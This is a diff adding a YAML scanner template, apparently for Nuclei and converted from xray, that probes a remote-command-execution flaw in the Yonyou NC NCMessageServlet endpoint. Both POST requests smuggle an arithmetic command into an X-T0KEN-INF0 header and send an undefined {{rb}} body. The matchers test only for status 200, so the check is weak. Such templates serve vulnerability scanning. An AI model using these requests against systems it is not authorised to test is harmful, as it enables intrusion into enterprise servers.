@@ -1,0 +1,39 @@
+id: poc-yaml-yongyou-nc-ncmessageservlet-rce
+
+info:
+  name: poc-yaml-yongyou-nc-ncmessageservlet-rce
+  author: Chaitin
+  severity: medium
+  tags: xray-converted,rce
+  reference:
+    - https://stack.chaitin.com/techblog/detail?id=92
+
+http:
+  - raw:
+      - |
+        POST /servlet/~baseapp/nc.message.bs.NCMessageServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data;
+        X-T0KEN-INF0: set /A {{rand_int(1000, 9999)}}+{{rand_int(1000, 9999)}}
+
+        {{rb}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        POST /servlet/~baseapp/nc.message.bs.NCMessageServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data;
+        X-T0KEN-INF0: expr {{rand_int(1000, 9999)}}+{{rand_int(1000, 9999)}}
+
+        {{rb}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
